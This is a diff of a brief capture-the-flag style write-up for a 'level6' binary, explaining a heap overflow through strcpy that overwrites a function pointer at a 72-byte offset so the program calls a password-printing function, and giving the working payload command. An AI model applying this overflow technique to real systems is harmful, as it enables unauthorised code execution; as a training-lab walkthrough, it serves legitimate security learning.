@@ -1,7 +1,8 @@
-we want to put the address of the n function into the return address with a heap overflow
+the n function print the pass file we need, and we've seen that the program return to the m function
+so the purpose of this level is to replace m with n using a heap overflow permitted by strcpy
 
-08048454 address of n
-\x54\x84\x04\x08
+0x08048454 -> \x54\x84\x04\x08 -> address of n
 
-we overflow at 72 bytes
-./level6 $(python -c 'print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x54\x84\x04\x08"')
+we use the pattern generator to find that we can overflow at 72 bytes and when we display the heap on gdb we see that the address of m is at 72 bytes
+we will overwrite it with the n address so the final payload is :
+./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
